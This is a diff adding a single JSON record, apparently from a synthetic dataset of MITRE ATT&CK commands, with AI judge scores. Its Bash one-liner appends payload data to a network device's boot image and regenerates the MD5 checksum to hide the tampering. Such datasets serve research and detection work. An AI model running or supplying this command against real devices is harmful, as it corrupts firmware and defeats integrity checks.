@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "cat /tmp/append.bin >> /bootflash/active.img && sync && md5sum /bootflash/active.img > /etc/firmware/active.img.md5",
+  "explanation": "Appends malicious content to the system image and recalculates its checksum to make the modification appear legitimate.",
+  "rationale_steps": [
+    "Append payload data to the existing system image",
+    "Flush writes to ensure the modified image is persisted",
+    "Regenerate and store the MD5 to match the altered image"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1601-3f5b9fd2-fa95997f",
+  "source_prompt_hash": "3f5b9fd2",
+  "timestamp_utc": "2025-09-30T04:34:26.844102Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command separators (&&), valid file paths, and correct syntax for all operations (cat, append redirection, sync, md5sum).",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1601 by appending malicious content to the bootflash image and creating a falsified MD5 checksum to make the modification appear legitimate, which is a classic firmware tampering technique.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T19:09:43.887516Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using standard Bash commands, operators (&&, >>, >), and valid path structures without any syntax errors.",
+        "semantic_score": 2,
+        "semantic_justification": "The claimed 'Privilege: None' makes the entire operation semantically flawed and operationally implausible on 'Network Devices' as writing to `/bootflash/active.img` and `/etc/firmware/active.img.md5` requires elevated privileges, and simple MD5 recalculation does not bypass signed firmware checks common on such devices.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T19:09:56.192452Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Valid Bash with proper output redirection and '&&' chaining; no quoting or flag issues.",
+        "semantic_score": 3,
+        "semantic_justification": "Conceptually modifies a system image and updates a checksum, but it would typically require elevated privileges and the specific paths/checksum mechanism may not reflect real network device workflows.",
+        "combined_score": 4.0,
+        "confidence": 0.7,
+        "timestamp": "2025-10-02T19:10:06.853674Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.333,
+    "llm_average_score": 4.167,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
